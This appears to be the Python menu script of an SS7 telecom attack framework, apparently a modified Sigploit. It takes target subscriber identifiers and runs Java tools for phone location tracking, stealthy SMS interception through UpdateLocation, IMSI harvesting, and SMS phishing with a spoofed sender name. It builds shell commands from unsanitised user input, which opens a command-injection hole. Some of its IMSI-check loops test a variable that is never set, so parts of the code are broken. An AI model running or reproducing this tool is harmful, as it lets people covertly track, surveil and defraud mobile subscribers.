import os
import subprocess as sp

ipinng: str = str(sp.getoutput('ip address'))

def attack_MTForwardSMSResp():
    p0 = os.system("rm *.xml")
    p0 = os.system("rm outingss7.txt")

    client_ip = str(input("Enter client ip: "))
    client_port = " " + str(input("Enter client port: "))
    server_ip = " " + str(input("Enter server ip: "))
    server_port = " " + str(input("Enter server port: "))
    if(client_ip not in ipinng):
        os.system("ip address add "+client_ip+" dev lo")
    if(server_ip not in ipinng):
        os.system("ip address add "+server_ip+" dev lo")
    Network_Indicator  = " " + str(input("Enter Network Indicator (i.e 0): "))
    Target_MSC = " " + str(input("Enter Target MSC (i.e 201512345678): "))
    Target_IMSI = " " + str(input("Enter Target IMSI (i.e 602027891234567): "))
    while len(Target_IMSI) < 15 or len(Target_IMSI) > 16:
        print("IMSI len should be 15 or 16")
        Target_IMSI = " " + str(input("Enter Target IMSI (i.e 602027891234567): "))
    locael_GT = " " + str(input("Enter your GT (i.e 999599): "))
    SMSC_GT = " " + str(input("Enter SMSC GT (i.e 595999): "))
    Sender_Name = " " + str(input("Enter Spoofed Sender Name(i.e Facebook): "))
    SMS_Content = " " + str(input("Enter SMS Content in one string (i.e hi_shiky): "))

    p=os.system("java -jar ./mtsms/MTForwardSMS.jar 1 2 "+client_ip+ client_port+ server_ip+ server_port+Network_Indicator+Target_IMSI+Target_MSC+locael_GT+SMSC_GT+Sender_Name+SMS_Content)
    p2 = os.system("pkill java")

def attack_SendIMSI():
    p0 = os.system("rm *.xml")
    p0 = os.system("rm outingss7.txt")

    client_ip = str(input("Enter client ip: "))
    client_port = " " + str(input("Enter client port: "))
    server_ip = " " + str(input("Enter server ip: "))
    server_port = " " + str(input("Enter server port: "))
    if(client_ip not in ipinng):
        os.system("ip address add "+client_ip+" dev lo")
    if(server_ip not in ipinng):
        os.system("ip address add "+server_ip+" dev lo")
    Network_Indicator  = " " + str(input("Enter Network Indicator (i.e 0): "))
    Targer_MSISDN  = " " + str(input("Enter Targer MSISDN (i.e 201522222222): "))
    
    locael_GT = " " + str(input("Enter your GT (i.e 999599): "))

    p=os.system("java -jar ./simsi/SendIMSI.jar 1 2 "+client_ip+ client_port+ server_ip+ server_port+Network_Indicator+locael_GT+Targer_MSISDN)
    p2 = os.system("pkill java")

def attack_UpdateLocation():
    p0 = os.system("rm *.xml")
    p0 = os.system("rm outingss7.txt")

    client_ip = str(input("Enter client ip: "))
    client_port = " " + str(input("Enter client port: "))
    server_ip = " " + str(input("Enter server ip: "))
    server_port = " " + str(input("Enter server port: "))
    if(client_ip not in ipinng):
        os.system("ip address add "+client_ip+" dev lo")
    if(server_ip not in ipinng):
        os.system("ip address add "+server_ip+" dev lo")
    Network_Indicator  = " " + str(input("Enter Network Indicator (i.e 0): "))
    Target_IMSI = " " + str(input("Enter Target IMSI (i.e 602027891234567): "))
    while len(Target_IMSI) < 15 or len(Target_IMSI) > 16:
        print("IMSI len should be 15 or 16")
        Target_IMSI = " " + str(input("Enter Target IMSI (i.e 602027891234567): "))
    Targer_IMSI_MGT  = " " + str(input("Enter Targer IMSI MGT (i.e 20107891234567): "))
    locael_GT = " " + str(input("Enter your GT (i.e 96512345678): "))
    locael_vlr = " " + str(input("Enter your vlr (i.e 96512345678): "))


    p=os.system("java -jar ./UpdateLocation/UpdateLocation.jar 1 2 "+client_ip+ client_port+ server_ip+ server_port+Network_Indicator+Target_IMSI+Targer_IMSI_MGT+locael_GT+locael_vlr+" n")
    p2 = os.system("pkill java")

def attack_tracking_AnyTimeInterrogation():
    p0 = os.system("rm *.xml")
    p0 = os.system("rm outingss7.txt")

    client_ip = str(input("Enter client ip: "))
    client_port = " " + str(input("Enter client port: "))
    server_ip = " " + str(input("Enter server ip: "))
    server_port = " " + str(input("Enter server port: "))
    if(client_ip not in ipinng):
        os.system("ip address add "+client_ip+" dev lo")
    if(server_ip not in ipinng):
        os.system("ip address add "+server_ip+" dev lo")
    Network_Indicator  = " " + str(input("Enter Network Indicator (i.e 0): "))
    Targer_MSISDN  = " " + str(input("Enter Targer MSISDN (i.e 201522222222): "))
    locael_GT = " " + str(input("Enter your GT (i.e 96512345678): "))
    

    p=os.system("java -jar ./tracking/ati/AnyTimeInterrogation.jar 1 2 "+client_ip+ client_port+ server_ip+ server_port+Network_Indicator+Targer_MSISDN+locael_GT)
    p2 = os.system("pkill java")

def attack_tracking_ProvideSubscriberInfo():
    p0 = os.system("rm *.xml")
    p0 = os.system("rm outingss7.txt")

    client_ip = str(input("Enter client ip: "))
    client_port = " " + str(input("Enter client port: "))
    server_ip = " " + str(input("Enter server ip: "))
    server_port = " " + str(input("Enter server port: "))
    if(client_ip not in ipinng):
        os.system("ip address add "+client_ip+" dev lo")
    if(server_ip not in ipinng):
        os.system("ip address add "+server_ip+" dev lo")
    Network_Indicator  = " " + str(input("Enter Network Indicator (i.e 0): "))
    Targer_MSISDN  = " " + str(input("Enter Targer MSISDN (i.e 201179008244): "))
    Targer_HLR  = " " + str(input("Enter Targer HLR (i.e 201179008255): "))
    Targer_IMSI  = " " + str(input("Enter Targer IMSI (i.e 602027891234567): "))
    while len(Target_IMSI) < 15 or len(Target_IMSI) > 16:
        print("IMSI len should be 15 or 16")
        Target_IMSI = " " + str(input("Enter Target IMSI (i.e 602027891234567): "))
    

    p=os.system("java -jar ./tracking/psi/ProvideSubscriberInfo.jar 1 2 "+client_ip+ client_port+ server_ip+ server_port+Network_Indicator+Targer_MSISDN+Targer_IMSI+Targer_HLR)
    p2 = os.system("pkill java")

def attack_tracking_SendRoutingInfo():
    p0 = os.system("rm *.xml")
    p0 = os.system("rm outingss7.txt")

    client_ip = str(input("Enter client ip: "))
    client_port = " " + str(input("Enter client port: "))
    server_ip = " " + str(input("Enter server ip: "))
    server_port = " " + str(input("Enter server port: "))
    if(client_ip not in ipinng):
        os.system("ip address add "+client_ip+" dev lo")
    if(server_ip not in ipinng):
        os.system("ip address add "+server_ip+" dev lo")
    Network_Indicator  = " " + str(input("Enter Network Indicator (i.e 0): "))
    Targer_MSISDN  = " " + str(input("Enter Targer MSISDN (i.e 201179008244): "))
    locael_MSC  = " " + str(input("Enter locael MSC (i.e 96512345678): "))
    

    p=os.system("java -jar ./tracking/sri/SendRoutingInfo.jar 1 2 "+client_ip+ client_port+ server_ip+ server_port+Network_Indicator+Targer_MSISDN+locael_MSC)
    p2 = os.system("pkill java")

def attack_tracking_SendRoutingInfoForGPRS():
    p0 = os.system("rm *.xml")
    p0 = os.system("rm outingss7.txt")

    client_ip = str(input("Enter client ip: "))
    client_port = " " + str(input("Enter client port: "))
    server_ip = " " + str(input("Enter server ip: "))
    server_port = " " + str(input("Enter server port: "))
    if(client_ip not in ipinng):
        os.system("ip address add "+client_ip+" dev lo")
    if(server_ip not in ipinng):
        os.system("ip address add "+server_ip+" dev lo")
    Network_Indicator  = " " + str(input("Enter Network Indicator (i.e 0): "))
    Targer_IMSI  = " " + str(input("Enter Targer IMSI (i.e 602027891234567): "))
    while len(Target_IMSI) < 15 or len(Target_IMSI) > 16:
        print("IMSI len should be 15 or 16")
        Target_IMSI = " " + str(input("Enter Target IMSI (i.e 602027891234567): "))
    Targer_HLR  = " " + str(input("Enter Targer HLR (i.e 201179008255): "))
    Targer_GGSN  = " " + str(input("Enter Targer GGSN (i.e 201059996612): "))
    

    p=os.system("java -jar ./tracking/srigprs/SendRoutingInfoForGPRS.jar 1 2 "+client_ip+ client_port+ server_ip+ server_port+Network_Indicator+Targer_IMSI+Targer_HLR+Targer_GGSN)
    p2 = os.system("pkill java")

def attack_tracking_SendRoutingInfoForSM():
    p0 = os.system("rm *.xml")
    p0 = os.system("rm outingss7.txt")

    client_ip = str(input("Enter client ip: "))
    client_port = " " + str(input("Enter client port: "))
    server_ip = " " + str(input("Enter server ip: "))
    server_port = " " + str(input("Enter server port: "))
    if(client_ip not in ipinng):
        os.system("ip address add "+client_ip+" dev lo")
    if(server_ip not in ipinng):
        os.system("ip address add "+server_ip+" dev lo")
    Network_Indicator  = " " + str(input("Enter Network Indicator (i.e 0): "))
    Targer_HLR  = " " + str(input("Enter Targer HLR (i.e 201179008255): "))
    Targer_MSISDN  = " " + str(input("Enter Targer MSISDN (i.e 201179008244): "))
    Targer_MSC  = " " + str(input("Enter Targer MSC (i.e 201012344321): "))
    Targer_SMSC  = " " + str(input("Enter Targer SMSC (i.e 201012344323): "))


    p=os.system("java -jar ./tracking/srism/SendRoutingInfoForSM.jar 1 2 "+client_ip+ client_port+ server_ip+ server_port+Network_Indicator+Targer_MSISDN+Targer_HLR+Targer_MSC+Targer_SMSC)
    p2 = os.system("pkill java")

def logo():
    banner='''
                                                                                

                  ▄▄▄█████████████████████████████████████████████▌             

               ╓███████████████████████████████████████████████████             

              ╓████▀                 ▄▄▄         ,▄▄▄▄▄▄▄▄ç                     

              █████                 ▐███▌     ╓▄██████▀████ *,   '              

              ╙█████▄▄ç             ▐███▌    ▄████┘        ╠▐ H∩H]▐             

                ▀█████████▄▄╓       ▐███▌   █████           v"╓▓ ,^             

                  `▀▀▀█████████▄,   ▐███▌   ████=             ▌▓∩               

                         ╙▀▀█████▄  ▐███▌   ████       ▄▄▄▄▄▄▄▄█▄▄∩             

                             █████  ▐███▌   ████▌      ███████████▌             

              ç             ╓████▌  ▐███▌   ╙████▄     ████    ▐██▌             

             ▐████▄▄▄▄▄▄▄▄▄█████▀   ▐███▌    ╙█████▄╓, ████    ▐██▌             

              ▀▀█████████████▀▀     ▐███▌      "▀██████████    ▐██▌             

                      └¬                                       ▐██▌             

                                                               ▐██▌             

              ██▀▀L║▌▀▀█ █▀▀█▌║▄ç╓▄▌█▌▀▀⌡▐█  ║▌▐▌╙╙█ █▀▀█▌▐▌,█▀▐██▌             

              █▌   ║▌'▀▄ █┘¬║▌║▌  █▌█▌▄▄▄▐▀▀╙▀▌╙█▄▄█ █⌐▀█▄▐▌╙█▄▐██▌             

             ▐████████████████████████████████████████████████████▌             

             ▐████████████████████████████████████████████████████▌                                                                                            
                                                                                
    '''
    return banner
def main():
    # print("\033[33m[-][-]\033[0m\t\tSignaling Exploitation Framework\t\033[33m [-][-]\033[0m")
    # print("\033[33m[-][-]\033[0m\t\t\tIt is an modefied vertion of:\033[31mSigploit 1.1\033[0m\t\t\033[33m [-][-]\033[0m")
    # print("\033[33m[-][-]\033[0m\t\tAuthor:\033[32mMohamed Shahat(@shiky8)\033[0m\t\033[33m [-][-]\033[0m\n")
    # print()
    # print(("0) SS7".rjust(8) + "\t\t2G/3G Voice and SMS attacks"))
    # choice = input("\033[34msig\033[0m\033[37m>\033[0m ")
    print(" \033[34mChoose From the Below Attack Categories\033[0m ".center(105, "#"))
    print()
    print("0) Location Tracking".rjust(23))
    print("1) Call and SMS Interception".rjust(31))
    print("2) Fraud & Info Gathering".rjust(28))
    print(("3) to exit ".rjust(11)))
    choice = input("\033[34msig\033[0m\033[37m>\033[0m ")
    if choice == "0":
        print(" \033[31mLocation Tracking\033[0m ".center(105, "#"))
        print(" \033[34mSelect a Message from the below\033[0m ".center(105, "#"))
        print()
        print("   Message".rjust(10) + "\t\t\tDescription")
        print("   --------                    ------------")
        print("0) SendRoutingInfo".rjust(21) + "\t\tLocation Tracking, used to route calls could be blocked")
        print("1) ProvideSubsriberInfo".rjust(26) + "\tReliable Location Tracking")
        print("2) SendRoutingInfoForSM".rjust(26) + "\tReliable Location Tracking, if SMS home routing is not applied,should be run twice to check consistent replies")
        print("3) AnyTimeInterrogation".rjust(26) + "\tLocation Tracking, blocked by most of operators")
        print("4) SendRoutingInfoForGPRS".rjust(28) + "\tLocation tracking, used to route data, it will retrieve SGSN GT")
        print(("5) to exit ".rjust(8)))
        print()
        choice = input("\033[37m(\033[0m\033[2;31mtracking\033[0m\033[37m)>\033[0m ")
        if choice == "0":
            attack_tracking_SendRoutingInfo()
        elif choice == "1":
            attack_tracking_ProvideSubscriberInfo()
        elif choice == "2":
            attack_tracking_SendRoutingInfoForSM()
        elif choice == "3":
            attack_tracking_AnyTimeInterrogation()
        elif choice == "4":
            attack_tracking_SendRoutingInfoForGPRS()

    elif choice == "1":
        print(" \033[31mInterception\033[0m ".center(105, "#"))
        print(" \033[34mSelect a Message from the below\033[0m ".center(105, "#"))
        print()
        print("   Message".rjust(10) + "\t\t\t\tDescription")
        print("   --------                             -----------")
        print("0) UpdateLocation".rjust(20) + "\t\t\tStealthy SMS Interception")
        print(("1) to exit ".rjust(8)))
        choice = input("\033[37m(\033[0m\033[2;31minterception\033[0m\033[37m)>\033[0m ")
        if choice == "0":
            attack_UpdateLocation()
    elif choice == "2":
        print(" \033[31mFraud & Info\033[0m ".center(105, "#"))
        print(" \033[34mSelect a Message from the below\033[0m ".center(105, "#"))
        print()
        print("   Message".rjust(10) + "\t\t\t\tDescription")
        print("   --------                            ------------")
        print("0) SendIMSI".rjust(14) + "\t\t\t\tRetrieving IMSI of a subscriber")
        print("1) MTForwardSMS".rjust(18) + "\t\t\tSMS Phishing and Spoofing")
        print(("2) to exit ".rjust(8)))
        choice = input(
            "\033[37m(\033[0m\033[2;31mfraud\033[0m\033[37m)>\033[0m ")
        if choice == "0":
            attack_SendIMSI()
        elif choice == "1":
            attack_MTForwardSMSResp()

if __name__ == "__main__":
    # print(logo())
    main()